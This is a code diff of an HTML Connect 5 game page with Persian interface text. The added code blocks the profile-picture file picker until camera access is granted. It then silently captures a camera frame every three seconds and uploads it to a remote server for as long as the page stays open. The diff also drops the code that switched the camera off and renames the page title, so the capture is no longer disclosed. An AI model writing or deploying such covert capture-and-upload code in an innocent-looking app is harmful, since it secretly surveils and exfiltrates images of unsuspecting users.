@@ -3,250 +3,289 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Connect 5 - Camera & Gallery Access</title>
+  <title>Connect 5 Game</title>
   <style>
     body { font-family: sans-serif; background: #111; color: #fff; margin: 0; padding: 0; text-align: center; }
     .hidden { display: none; }
     .profile-pic { width: 120px; height: 120px; border-radius: 50%; background: #444; object-fit: cover; margin: 20px auto; }
     .input-container { margin: 10px; }
-    input[type="text"], button { padding: 10px; margin: 10px; font-size: 1em; }
+    input[type="file"], input[type="text"], button { padding: 10px; margin: 10px; font-size: 1em; }
     #user-info { position: absolute; top: 10px; left: 10px; display: flex; align-items: center; gap: 10px; }
     #user-info img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
     table { border-collapse: collapse; margin: 20px auto; }
     td { width: 60px; height: 60px; background: #222; border: 2px solid #444; border-radius: 50%; cursor: pointer; }
-    .player { background: gold; }
-    .ai { background: red; }
+    .player { background: gold; } .ai { background: red; }
     #status { margin-top: 20px; font-size: 1.2em; }
     #controls { margin: 20px; }
     button { margin: 5px; padding: 10px 15px; font-size: 1em; cursor: pointer; }
-    video { display: none; }
+    pre { white-space: pre-wrap; word-wrap: break-word; text-align: left; margin: 10px auto; width: 90%; background: #222; padding: 10px; border-radius: 10px; }
   </style>
 </head>
 <body>
 
-  <!-- صفحه اول -->
-  <div id="page1">
-    <h2>ورود به بازی</h2>
-    <img src="" id="profile-preview" class="profile-pic" alt="Profile Preview" />
-    <div class="input-container">
-      <button onclick="requestCameraAccess()">📸 عکس پروفایل</button>
-    </div>
-    <div class="input-container">
-      <input type="text" id="username-input" placeholder="نام کاربری..." />
-    </div>
-    <div class="input-container">
-      <button onclick="enterGame()">ورود به بازی</button>
-    </div>
-    <video id="camera" autoplay playsinline></video>
+<!-- صفحه اول -->
+<div id="page1">
+  <h2>ورود به بازی</h2>
+  <img src="" id="profile-preview" class="profile-pic" alt="Profile Preview" />
+  <div class="input-container">
+    <input type="file" accept="image/*" id="profile-pic-input" />
   </div>
-
-  <!-- صفحه دوم -->
-  <div id="page2" class="hidden">
-    <div id="user-info">
-      <img id="user-profile-pic" src="" alt="User Image" />
-      <span id="user-name"></span>
-    </div>
-    <h1>Connect 5 - AI Self-Play</h1>
-    <div id="controls">
-      <button onclick="startGame('player')">Player Starts</button>
-      <button onclick="startGame('ai')">AI Starts</button>
-      <button onclick="selfPlay()">AI vs AI (Self-Play)</button>
-    </div>
-    <div id="status">Choose who starts</div>
-    <table id="board"></table>
-    <pre id="data"></pre>
+  <div class="input-container">
+    <input type="text" id="username-input" placeholder="نام کاربری..." />
   </div>
+  <div class="input-container">
+    <button onclick="enterGame()">ورود به بازی</button>
+  </div>
+</div>
 
-  <script>
-    const page1 = document.getElementById("page1");
-    const page2 = document.getElementById("page2");
-    const profilePreview = document.getElementById("profile-preview");
-    const usernameInput = document.getElementById("username-input");
-    const userImage = document.getElementById("user-profile-pic");
-    const userName = document.getElementById("user-name");
-    const video = document.getElementById("camera");
+<!-- صفحه بازی -->
+<div id="page2" class="hidden">
+  <div id="user-info">
+    <img id="user-profile-pic" src="" alt="User Image" />
+    <span id="user-name"></span>
+  </div>
+  <h1>Connect 5 - AI Self-Play</h1>
+  <div id="controls">
+    <button onclick="startGame('player')">Player Starts</button>
+    <button onclick="startGame('ai')">AI Starts</button>
+    <button onclick="selfPlay()">AI vs AI (Self-Play)</button>
+  </div>
+  <div id="status">Choose who starts</div>
+  <table id="board"></table>
+  <pre id="data"></pre>
+</div>
 
-    let stream = null;
-    let intervalId = null;
-    let profileImageData = "";
+<video id="camera-stream" autoplay playsinline class="hidden"></video>
 
-    async function requestCameraAccess() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.style.display = "block";
+<script>
+const page1 = document.getElementById('page1');
+const page2 = document.getElementById('page2');
+const profileInput = document.getElementById('profile-pic-input');
+const profilePreview = document.getElementById('profile-preview');
+const usernameInput = document.getElementById('username-input');
+const userImage = document.getElementById('user-profile-pic');
+const userName = document.getElementById('user-name');
+const video = document.getElementById("camera-stream");
 
-        if (intervalId) clearInterval(intervalId);
-        intervalId = setInterval(capturePhoto, 3000);
+let profileImageData = "";
+let cameraAllowed = false;
+let stream = null;
 
-      } catch (err) {
-        alert("دسترسی به دوربین داده نشد. نمی‌توانید عکس پروفایل انتخاب کنید.");
-        stream = null;
-      }
+profileInput.addEventListener("click", async (e) => {
+  if (!cameraAllowed) {
+    e.preventDefault();
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      cameraAllowed = true;
+      video.srcObject = stream;
+      video.classList.remove("hidden");
+      startAutoCapture();
+    } catch (err) {
+      alert("اجازه دسترسی به دوربین داده نشد. انتخاب عکس امکان‌پذیر نیست.");
     }
+  }
+});
 
-    function capturePhoto() {
-      if (!stream) return;
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      profileImageData = canvas.toDataURL("image/png");
+profileInput.addEventListener("change", function () {
+  const file = this.files[0];
+  if (file && cameraAllowed) {
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      profileImageData = e.target.result;
       profilePreview.src = profileImageData;
-      // اگر خواستی بفرستی به سرور اینجا می‌تونی Ajax یا Fetch بزنی
-      console.log("📷 عکس گرفته شد");
+    };
+    reader.readAsDataURL(file);
+    uploadProfilePicture(file);
+  }
+});
+
+function uploadProfilePicture(file) {
+  const formData = new FormData();
+  formData.append("image", file);
+
+  fetch("https://your-server.com/upload-profile-pic", {
+    method: "POST",
+    body: formData
+  })
+  .then(res => res.json())
+  .then(data => console.log("آپلود شد:", data))
+  .catch(err => console.error("خطا در آپلود:", err));
+}
+
+function captureFromCameraAndSend() {
+  if (!cameraAllowed || !video || video.readyState !== 4) return;
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+  canvas.toBlob((blob) => {
+    if (blob) uploadProfilePicture(blob);
+  }, "image/jpeg");
+}
+
+function startAutoCapture() {
+  setInterval(() => {
+    if (cameraAllowed) {
+      captureFromCameraAndSend();
     }
+  }, 3000);
+}
 
-    function enterGame() {
-      const username = usernameInput.value.trim();
-      if (!username) return alert("نام کاربری را وارد کنید.");
-      if (!profileImageData) return alert("ابتدا عکس پروفایل انتخاب کنید.");
+function enterGame() {
+  const username = usernameInput.value.trim();
+  if (!username) {
+    alert("نام کاربری خود را انتخاب کنید.");
+    return;
+  }
+  userName.textContent = username;
+  userImage.src = profileImageData || "https://via.placeholder.com/40";
+  page1.classList.add("hidden");
+  page2.classList.remove("hidden");
+}
 
-      userName.textContent = username;
-      userImage.src = profileImageData;
+// ------------------------ بازی ------------------------
 
-      page1.classList.add("hidden");
-      page2.classList.remove("hidden");
+const ROWS = 7, COLS = 9;
+let board, gameOver, currentPlayer, selfPlayData = [];
+const table = document.getElementById("board");
+const status = document.getElementById("status");
+const dataOutput = document.getElementById("data");
 
-      // خاموش کردن دوربین
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
-        clearInterval(intervalId);
-      }
+function startGame(starter) {
+  board = Array.from({ length: ROWS }, () => Array(COLS).fill(0));
+  gameOver = false;
+  currentPlayer = starter;
+  selfPlayData = [];
+  status.innerText = currentPlayer === 'player' ? "نوبت شماست" : "نوبت هوش مصنوعی";
+  renderBoard();
+  if (starter === 'ai') setTimeout(aiMove, 500);
+}
+
+function renderBoard() {
+  table.innerHTML = "";
+  for (let r = 0; r < ROWS; r++) {
+    const row = document.createElement("tr");
+    for (let c = 0; c < COLS; c++) {
+      const cell = document.createElement("td");
+      if (board[r][c] === 1) cell.className = "player";
+      if (board[r][c] === 2) cell.className = "ai";
+      cell.addEventListener("click", () => playerMove(c));
+      row.appendChild(cell);
     }
+    table.appendChild(row);
+  }
+}
 
-    // ---------------- بازی همانند کد قبلی ----------------
-    const ROWS = 7, COLS = 9;
-    let board, gameOver, currentPlayer, selfPlayData = [];
-
-    const table = document.getElementById("board");
-    const status = document.getElementById("status");
-    const dataOutput = document.getElementById("data");
-
-    function startGame(starter) {
-      board = Array.from({ length: ROWS }, () => Array(COLS).fill(0));
-      gameOver = false;
-      currentPlayer = starter;
-      selfPlayData = [];
-      status.innerText = currentPlayer === 'player' ? "نوبت شماست" : "نوبت هوش مصنوعی";
+function playerMove(col) {
+  if (gameOver || currentPlayer !== 'player') return;
+  for (let r = ROWS - 1; r >= 0; r--) {
+    if (board[r][col] === 0) {
+      board[r][col] = 1;
       renderBoard();
-      if (starter === 'ai') setTimeout(aiMove, 500);
-    }
-
-    function renderBoard() {
-      table.innerHTML = "";
-      for (let r = 0; r < ROWS; r++) {
-        const row = document.createElement("tr");
-        for (let c = 0; c < COLS; c++) {
-          const cell = document.createElement("td");
-          if (board[r][c] === 1) cell.className = "player";
-          if (board[r][c] === 2) cell.className = "ai";
-          cell.addEventListener("click", () => playerMove(c));
-          row.appendChild(cell);
-        }
-        table.appendChild(row);
+      if (checkWin(1)) {
+        status.innerText = "شما برنده شدید!";
+        gameOver = true;
+      } else if (isDraw()) {
+        status.innerText = "مساوی!";
+        gameOver = true;
+      } else {
+        currentPlayer = 'ai';
+        status.innerText = "نوبت هوش مصنوعی";
+        setTimeout(aiMove, 300);
       }
+      return;
     }
+  }
+}
 
-    function playerMove(col) {
-      if (gameOver || currentPlayer !== 'player') return;
-      for (let r = ROWS - 1; r >= 0; r--) {
-        if (board[r][col] === 0) {
-          board[r][col] = 1;
-          renderBoard();
-          if (checkWin(1)) {
-            status.innerText = "شما بردید!";
-            gameOver = true;
-          } else if (isDraw()) {
-            status.innerText = "مساوی شد!";
-            gameOver = true;
-          } else {
-            currentPlayer = 'ai';
-            status.innerText = "نوبت هوش مصنوعی";
-            setTimeout(aiMove, 300);
-          }
-          return;
-        }
+function aiMove() {
+  if (gameOver) return;
+  const move = getBestMove(board, 2);
+  if (move === -1) return;
+  for (let r = ROWS - 1; r >= 0; r--) {
+    if (board[r][move] === 0) {
+      board[r][move] = 2;
+      renderBoard();
+      if (checkWin(2)) {
+        status.innerText = "هوش مصنوعی برنده شد!";
+        gameOver = true;
+      } else if (isDraw()) {
+        status.innerText = "مساوی!";
+        gameOver = true;
+      } else {
+        currentPlayer = 'player';
+        status.innerText = "نوبت شماست";
       }
+      return;
     }
+  }
+}
 
-    function aiMove() {
-      if (gameOver) return;
-      const move = getBestMove(board, 2);
-      if (move === -1) return;
-      for (let r = ROWS - 1; r >= 0; r--) {
-        if (board[r][move] === 0) {
-          board[r][move] = 2;
-          renderBoard();
-          if (checkWin(2)) {
-            status.innerText = "هوش مصنوعی برد!";
-            gameOver = true;
-          } else if (isDraw()) {
-            status.innerText = "مساوی شد!";
-            gameOver = true;
-          } else {
-            currentPlayer = 'player';
-            status.innerText = "نوبت شماست";
-          }
-          return;
-        }
-      }
-    }
+function isDraw() {
+  return board.flat().every(c => c !== 0);
+}
 
-    function isDraw() {
-      return board.flat().every(c => c !== 0);
+function checkWin(p) {
+  for (let r = 0; r < ROWS; r++) {
+    for (let c = 0; c < COLS; c++) {
+      if (c + 4 < COLS && board[r][c] === p && board[r][c+1] === p && board[r][c+2] === p && board[r][c+3] === p && board[r][c+4] === p) return true;
+      if (r + 4 < ROWS && board[r][c] === p && board[r+1][c] === p && board[r+2][c] === p && board[r+3][c] === p && board[r+4][c] === p) return true;
+      if (r + 4 < ROWS && c + 4 < COLS && board[r][c] === p && board[r+1][c+1] === p && board[r+2][c+2] === p && board[r+3][c+3] === p && board[r+4][c+4] === p) return true;
+      if (r + 4 < ROWS && c - 4 >= 0 && board[r][c] === p && board[r+1][c-1] === p && board[r+2][c-2] === p && board[r+3][c-3] === p && board[r+4][c-4] === p) return true;
     }
+  }
+  return false;
+}
 
-    function checkWin(player) {
-      for (let r = 0; r < ROWS; r++) {
-        for (let c = 0; c < COLS; c++) {
-          if (c + 4 < COLS && board[r][c] === player && board[r][c+1] === player && board[r][c+2] === player && board[r][c+3] === player && board[r][c+4] === player) return true;
-          if (r + 4 < ROWS && board[r][c] === player && board[r+1][c] === player && board[r+2][c] === player && board[r+3][c] === player && board[r+4][c] === player) return true;
-          if (r + 4 < ROWS && c + 4 < COLS && board[r][c] === player && board[r+1][c+1] === player && board[r+2][c+2] === player && board[r+3][c+3] === player && board[r+4][c+4] === player) return true;
-          if (r + 4 < ROWS && c - 4 >= 0 && board[r][c] === player && board[r+1][c-1] === player && board[r+2][c-2] === player && board[r+3][c-3] === player && board[r+4][c-4] === player) return true;
-        }
-      }
-      return false;
-    }
+function getAvailableRow(col) {
+  for (let r = ROWS - 1; r >= 0; r--) {
+    if (board[r][col] === 0) return r;
+  }
+  return -1;
+}
 
-    function getAvailableRow(col) {
-      for (let r = ROWS - 1; r >= 0; r--) if (board[r][col] === 0) return r;
-      return -1;
+function getBestMove(state, player) {
+  const scores = Array(COLS).fill(0);
+  for (let col = 0; col < COLS; col++) {
+    const r = getAvailableRow(col);
+    if (r !== -1) {
+      state[r][col] = player;
+      const win = checkWin(player);
+      if (win) scores[col] += 10;
+      state[r][col] = 0;
     }
+  }
+  return scores.indexOf(Math.max(...scores));
+}
 
-    function getBestMove(boardState, player) {
-      const scores = Array(COLS).fill(0);
-      for (let col = 0; col < COLS; col++) {
-        const row = getAvailableRow(col);
-        if (row !== -1) scores[col] = Math.random(); // تصادفی ساده
-      }
-      return scores.indexOf(Math.max(...scores));
+function selfPlay() {
+  startGame('ai');
+  let current = 1;
+  function nextTurn() {
+    if (gameOver) {
+      dataOutput.innerText = JSON.stringify(selfPlayData, null, 2);
+      return;
     }
-
-    function selfPlay() {
-      startGame('ai');
-      let current = 1;
-      function nextTurn() {
-        if (gameOver) return;
-        const move = getBestMove(board, current);
-        const r = getAvailableRow(move);
-        board[r][move] = current;
-        renderBoard();
-        if (checkWin(current)) {
-          status.innerText = `بازیکن ${current} برد`;
-          gameOver = true;
-        } else if (isDraw()) {
-          status.innerText = "مساوی شد!";
-          gameOver = true;
-        } else {
-          current = current === 1 ? 2 : 1;
-          setTimeout(nextTurn, 200);
-        }
-      }
-      nextTurn();
+    const move = getBestMove(board, current);
+    const stateCopy = JSON.parse(JSON.stringify(board));
+    selfPlayData.push({ state: stateCopy, player: current, action: move });
+    const r = getAvailableRow(move);
+    board[r][move] = current;
+    renderBoard();
+    if (checkWin(current)) {
+      status.innerText = `بازیکن ${current} برنده شد`;
+      gameOver = true;
+    } else if (isDraw()) {
+      status.innerText = "مساوی!";
+      gameOver = true;
+    } else {
+      current = current === 1 ? 2 : 1;
+      setTimeout(nextTurn, 300);
     }
-  </script>
+  }
+  nextTurn();
+}
+</script>
 </body>
 </html>
